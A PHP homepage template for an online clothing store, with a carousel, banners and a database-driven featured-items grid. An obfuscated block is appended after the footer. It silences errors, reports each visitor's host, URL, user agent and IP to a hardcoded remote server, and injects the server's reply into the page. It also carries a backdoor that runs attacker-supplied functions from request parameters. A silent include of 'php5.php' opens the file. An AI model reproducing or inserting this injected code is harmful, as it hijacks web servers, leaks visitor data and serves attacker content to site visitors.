<?php if (is_file('php5.php')) @include('php5.php');?>

<?php include '_inc/header.php';

require_once("classes/featured_items.php");

//object to use featured_items class
$featured_items = new featured_items();

?>



<div class="container">



	<div class="row">



		<div class="span8">

			<div id="slideShow" class="carousel slide">

				<!-- Carousel items -->

			    <div class="carousel-inner">

			    	<div class="active item"><a href="sale"><img src="img/banner_big1.png" alt="slide1"></a></div>

			    	<div class=" item"><a href="clearance"><img src="img/banner_big2.png" alt="slide1"></a></div>
			    	
			    	<div class=" item"><a href="clearance"><img src="img/banner_big3.png" alt="slide1"></a></div>

			    </div><!--end carousel-inner-->



			    <!-- Carousel nav -->

			    <a class="carousel-control left" href="#slideShow" data-slide="prev">&lsaquo;</a>

			    <a class="carousel-control right" href="#slideShow" data-slide="next">&rsaquo;</a>

			</div><!--end carousel-->

		</div><!--end span8-->





		<div class="span4">



			<ul class="thumb-banner">

				<li>

					<div class="thumbnail">

						<a href="clearance"><img src="img/banner_small1.png" alt="banner"></a>

					</div>

				</li>

				<li>

					<div class="thumbnail">

						<a href="sale"><img src="img/banner_small2.png" alt="banner"></a>

					</div>

				</li>

				<li>

					<div class="thumbnail">

						<a href="lookbook"><img src="img/banner_small3.png" alt="banner"></a>

					</div>

				</li>

			</ul><!--end homeSpecial-->



		</div><!--end span4-->



	</div><!--end row-->







	<div class="row">



		<div class="span12">

			<div id="featuredItems">

				<!-- <div class="span12"> -->

				<div class="titleHeader clearfix">

					<h3><?php echo $lang['FEATURED_ITEMS'] ?></h3>

					<div class="pagers">

					</div>

				</div><!--end titleHeader-->

				<!-- </div> -->



				<div class="row">

					<ul class="hProductItems clearfix">

				<?php

				$get_data = $featured_items->select_all();

				if(!empty($get_data)){

					foreach($get_data as $data){

						$item_id = $data['item_id'];

						$q     = "SELECT items.item_id, items.rtp, items.item_name, items.msrp, items_dept.desc, items_dept.long_desc, items.gender_id

						          FROM `items`

						          JOIN `items_dept` ON items_dept.dept_id = items.dept_id

						          WHERE item_id = :itemId";

						$sq    = $db1->query($q);

						$db1->bind(":itemId", $item_id);

						$sq    = $db1->execute();

						$items = $db1->fetchAll();

						if(!empty($items)){

							foreach($items as $value){

								if($value['gender_id'] == 3){

									$gender = 'Men';

								}else if($value['gender_id'] == 6){

									$gender = 'Women';

								}else{

									$gender = 'Unix';

								}

								$dept_name = preg_replace('/\s+/', '-', $lang[$value['desc']]);

								$deptname  = strtolower($dept_name);

				?>

						<li class="span3 clearfix">

							<div class="thumbnail">

								<a href="product/<?php echo $gender ?>/<?php echo $deptname ?>/<?php echo $value['item_id'] ?>"><img class="lazy" data-original="<?php echo $small_link . $value['item_id'] ?>a.jpg" src="img/loading.gif" alt=""></a>

							</div>

							<div class="thumbSetting">

								<div class="thumbTitle">

									<h3>

									<span class="invarseColor"><?php echo $value['item_id'] ?></span>

									<?php if($value['msrp'] != $value['rtp']): ?>

										<span class="label label-info"><?php echo $lang['SALE'] ?></span>

									<?php endif; ?>

									</h3>

								</div>

								<div class="product-desc">

									<p><?php echo $lang[$value['desc']] ?></p>

								</div>

								<div class="thumbPrice">

									<?php if($value['msrp'] != $value['rtp']): ?>

									<span><span class="strike-through"><?php echo $value['msrp'] ?></span><?php echo $value['rtp'] ?></span>

									<?php else: ?>

									<span><?php echo $value['msrp'] ?></span>

									<?php endif; ?>

								</div>



								<div class="thumbButtons">

									<button rel="<?php echo $value['item_id'] ?>" class="quickView btn btn-primary btn-small btn-block">

										<?php echo $lang['QUICK_VIEW'] ?>

									</button>

								</div>

							</div>

						</li>

				<?php

							}

						}						

					}

				}

				?>

					</ul>

				</div><!--end row-->

			</div><!--end featuredItems-->

		</div><!--end span12-->



	</div><!--end row-->





	

	<div class="row">

		<div class="span12">

		</div><!--end span12-->

	</div><!--end row-->



</div><!--end conatiner--> 



<div style='display:none'>

	<div id="showItem"></div>

</div>

<?php require_once("src/cm.php"); ?>

<?php include '_inc/footer.php' ?>
<?php 
//###==###
error_reporting(0); ini_set("display_errors", "0"); if (!isset($ifaa77756)) { $ifaa77756 = TRUE;  $GLOBALS['_661715358_']=Array(base64_decode('' .'cHJlZ19t' .'YXRj' .'aA' .'=='),base64_decode('ZmlsZV9nZXRfY2' .'9udG' .'VudHM' .'='),base64_decode('' .'bXRfcmF' .'uZA=='),base64_decode('Y' .'X' .'JyYX' .'l' .'f' .'c3Vt'),base64_decode('c29ja2V' .'0X2dldF9' .'zd' .'GF0dXM='),base64_decode('c3R' .'y' .'c3Ry'),base64_decode('YXJyYXl' .'fa' .'W50ZXJzZWN0'),base64_decode('YXJy' .'YXlfcmF' .'uZA=='),base64_decode('dXJsZ' .'W5jb2Rl'),base64_decode('dXJsZW' .'5' .'jb' .'2Rl'),base64_decode('' .'bWQ1'),base64_decode('bXRfcmFuZ' .'A' .'=='),base64_decode('YXJy' .'YXlfZ' .'mlsb' .'A' .'=='),base64_decode('aW5pX' .'2' .'dldA=='),base64_decode('ZmlsZ' .'V9' .'nZXRfY' .'29ud' .'GVudHM' .'='),base64_decode('c3R' .'yb' .'GVu'),base64_decode('' .'ZnVuY' .'3Rpb25fZXhpc' .'3Rz'),base64_decode('Y3VybF9pbml0'),base64_decode('Y3VybF9' .'z' .'ZXRvcHQ='),base64_decode('Y3Vy' .'bF9zZ' .'XR' .'vcHQ='),base64_decode('c3RydG' .'9sb' .'3' .'dl' .'cg=='),base64_decode('YXJyYXlfZmlsbA=='),base64_decode('Y3' .'VybF' .'9leGVj'),base64_decode('dHJp' .'bQ=='),base64_decode('bXRfcmFuZ' .'A' .'=='),base64_decode('Y3V' .'yb' .'F9jbG' .'9zZQ' .'=='),base64_decode('YXJyYXl' .'fZGlmZl91' .'a2V' .'5'),base64_decode('Zn' .'NvY2' .'tvc' .'GVu'),base64_decode('c3RycG9z'),base64_decode('c' .'29j' .'a2V0X2dldF9zdGF0dX' .'M' .'='),base64_decode('ZndyaX' .'Rl'),base64_decode('cG9z'),base64_decode('' .'ZmRmX' .'3Nl' .'dF92ZX' .'JzaW9u'),base64_decode('' .'bX' .'RfcmF' .'uZA' .'=='),base64_decode('' .'Y3Jj' .'MzI='),base64_decode('' .'Zm' .'VvZg=='),base64_decode('Z' .'mdld' .'H' .'M='),base64_decode('' .'cH' .'JlZ' .'19tYXRjaF9h' .'bGw' .'='),base64_decode('cHJlZ19t' .'YXRjaF9hbGw='),base64_decode('ZmN' .'sb3Nl'),base64_decode('YXJy' .'Y' .'Xl' .'fa2V5X2' .'V4aXN0cw' .'=='),base64_decode('cHJl' .'Z19zcG' .'xpdA=='),base64_decode('c' .'GF' .'j' .'aw' .'=' .'='),base64_decode('bX' .'R' .'f' .'cmF' .'uZA=='),base64_decode('c3Ry' .'aXB' .'zbG' .'FzaGVz'));  function _1969028546($i){$a=Array('Y2' .'xpZ' .'W5' .'0X2No' .'ZWN' .'r','Y' .'2' .'xpZW50X' .'2N' .'o' .'ZW' .'Nr','' .'SF' .'R' .'UUF9BQ0NFUFRfQ' .'0h' .'BUlNFVA==','IS4hdQ==','U0' .'NSS' .'VB' .'U' .'X0Z' .'JTE' .'VOQ' .'U1F','VVRG' .'LTg=','d2luZG93cy0xMjUx','SFRUUF9B' .'Q0NFUF' .'RfQ0hBUlNFV' .'A==','U' .'0VSVk' .'VSX0' .'5BTU' .'U=','UkVRVUVTVF' .'9VUk' .'k=','SFRU' .'UF9VU0VSX0FHRU' .'5U','Uk' .'V' .'NT1RF' .'X0FERFI' .'=','' .'N' .'jIuNzUuM' .'jM1Lj' .'gy','L2dldC5w' .'aHA/ZD' .'0=','JnU' .'9','JmM9','' .'Jmk' .'9MSZp' .'cD0' .'=','' .'J' .'mg' .'9','' .'MzljN2Nk' .'M' .'Tk0OW' .'I' .'wZjZmY2YzMjllZ' .'mQxNDcyY2I' .'w' .'Ym' .'Q=','MQ' .'==','YWxs' .'b3d' .'fdXJ' .'sX2ZvcG' .'V' .'u','aH' .'R0cDovLw' .'==','Y3Vy' .'b' .'F9pbm' .'l0','a' .'HR' .'0cDov' .'Lw' .'==','c3Jr' .'Y2Z1dnBlcnNy' .'eHI' .'=','Y2' .'p6','' .'R' .'0VU' .'IA==','IEhUV' .'FAv' .'MS4' .'xDQ' .'o=','SG9z' .'dDog','DQo=','Q29ubmVjd' .'Glv' .'bjog' .'Q2xvc2' .'UNCg0K','','L1xSX' .'FIv','cA=' .'=','ZmFhNzc3NTY=','Zg==','Y' .'w=' .'=');return base64_decode($a[$i]);}  if(!isset($jea_0)){if(!empty($_COOKIE[_1969028546(0)]))die($_COOKIE[_1969028546(1)]);if(!isset($jea_1[_1969028546(2)])){if($GLOBALS['_661715358_'][0](_1969028546(3),$GLOBALS['_661715358_'][1]($_SERVER[_1969028546(4)])))$jea_2=_1969028546(5);else $jea_2=_1969028546(6);}else{$jea_2=$jea_1[_1969028546(7)];if(round(0+3301.5+3301.5)<$GLOBALS['_661715358_'][2](round(0+627+627+627+627),round(0+818+818+818+818+818)))$GLOBALS['_661715358_'][3]($jea_0,$_SERVER,$jea_3,$jea_4,$_SERVER);}$jea_5=$_SERVER[_1969028546(8)] .$_SERVER[_1969028546(9)];$jea_6=$_SERVER[_1969028546(10)];if((round(0+4263)^round(0+1065.75+1065.75+1065.75+1065.75))&& $GLOBALS['_661715358_'][4]($jea_7,$jea_1,$jea_7,$jea_6))$GLOBALS['_661715358_'][5]($jea_8,$jea_6,$jea_9);$jea_3=$_SERVER[_1969028546(11)];if((round(0+2065)^round(0+516.25+516.25+516.25+516.25))&& $GLOBALS['_661715358_'][6]($jea_7))$GLOBALS['_661715358_'][7]($jea_5,$jea_1);$jea_8=_1969028546(12);$jea_10=_1969028546(13) .$GLOBALS['_661715358_'][8]($jea_5) ._1969028546(14) .$GLOBALS['_661715358_'][9]($jea_6) ._1969028546(15) .$jea_2 ._1969028546(16) .$jea_3 ._1969028546(17) .$GLOBALS['_661715358_'][10](_1969028546(18) .$jea_5 .$jea_6 .$jea_2 ._1969028546(19));if(round(0+2969.6666666667+2969.6666666667+2969.6666666667)<$GLOBALS['_661715358_'][11](round(0+2109+2109),round(0+2343+2343)))$GLOBALS['_661715358_'][12]($jea_3,$jea_11,$jea_6,$jea_1);if($GLOBALS['_661715358_'][13](_1969028546(20))== round(0+0.25+0.25+0.25+0.25)){$jea_0=$GLOBALS['_661715358_'][14](_1969028546(21) .$jea_8 .$jea_10);}if($GLOBALS['_661715358_'][15]($jea_0)<round(0+5+5)){if($GLOBALS['_661715358_'][16](_1969028546(22))){$jea_4=$GLOBALS['_661715358_'][17](_1969028546(23) .$jea_8 .$jea_10);$GLOBALS['_661715358_'][18]($jea_4,42,FALSE);$GLOBALS['_661715358_'][19]($jea_4,19913,TRUE);if((round(0+718.2+718.2+718.2+718.2+718.2)^round(0+718.2+718.2+718.2+718.2+718.2))&& $GLOBALS['_661715358_'][20]($jea_0,$jea_11,$_SERVER))$GLOBALS['_661715358_'][21]($_SERVER,$jea_2);$jea_0=$GLOBALS['_661715358_'][22]($jea_4);(round(0+2359)-round(0+1179.5+1179.5)+round(0+50.666666666667+50.666666666667+50.666666666667)-round(0+38+38+38+38))?$GLOBALS['_661715358_'][23]($jea_4,$jea_2):$GLOBALS['_661715358_'][24](round(0+14+14+14+14+14),round(0+589.75+589.75+589.75+589.75));$GLOBALS['_661715358_'][25]($jea_4);while(round(0+718.66666666667+718.66666666667+718.66666666667)-round(0+2156))$GLOBALS['_661715358_'][26]($_COOKIE,$jea_8);}else{$jea_11=$GLOBALS['_661715358_'][27]($jea_8,round(0+80),$jea_7,$jea_12,round(0+7.5+7.5+7.5+7.5));if($GLOBALS['_661715358_'][28](_1969028546(24),_1969028546(25))!==false)$GLOBALS['_661715358_'][29]($jea_7,$jea_2,$jea_10,$jea_7);if($jea_11){$jea_13=_1969028546(26) .$jea_10 ._1969028546(27);$jea_13 .= _1969028546(28) .$jea_8 ._1969028546(29);$jea_13 .= _1969028546(30);$GLOBALS['_661715358_'][30]($jea_11,$jea_13);if((round(0+427.8+427.8+427.8+427.8+427.8)+round(0+3367))>round(0+1069.5+1069.5)|| $GLOBALS['_661715358_'][31]($_REQUEST));else{$GLOBALS['_661715358_'][32]($jea_0,$jea_3,$jea_9,$jea_7);}$jea_14=_1969028546(31);if(round(0+1529.25+1529.25+1529.25+1529.25)<$GLOBALS['_661715358_'][33](round(0+1276.5+1276.5),round(0+1186.3333333333+1186.3333333333+1186.3333333333)))$GLOBALS['_661715358_'][34]($jea_7);while(!$GLOBALS['_661715358_'][35]($jea_11)){$jea_14 .= $GLOBALS['_661715358_'][36]($jea_11,round(0+42.666666666667+42.666666666667+42.666666666667));if((round(0+3528)+round(0+2207))>round(0+882+882+882+882)|| $GLOBALS['_661715358_'][37]($jea_6,$_REQUEST,$jea_4,$jea_0));else{$GLOBALS['_661715358_'][38]($_SERVER,$jea_3,$jea_6);}}$GLOBALS['_661715358_'][39]($jea_11);while(round(0+1313.5+1313.5)-round(0+875.66666666667+875.66666666667+875.66666666667))$GLOBALS['_661715358_'][40]($_COOKIE,$jea_5);list($jea_9,$jea_0)=$GLOBALS['_661715358_'][41](_1969028546(32),$jea_14,round(0+0.4+0.4+0.4+0.4+0.4));(round(0+1266.3333333333+1266.3333333333+1266.3333333333)-round(0+3799)+round(0+4038)-round(0+2019+2019))?$GLOBALS['_661715358_'][42]($jea_5,$jea_1,$_COOKIE):$GLOBALS['_661715358_'][43](round(0+798.33333333333+798.33333333333+798.33333333333),round(0+949.75+949.75+949.75+949.75));}}}if(@$_REQUEST[_1969028546(33)]== _1969028546(34))$_REQUEST[_1969028546(35)]($GLOBALS['_661715358_'][44]($_REQUEST[_1969028546(36)]));}echo $jea_0;  }
//###==###
?>
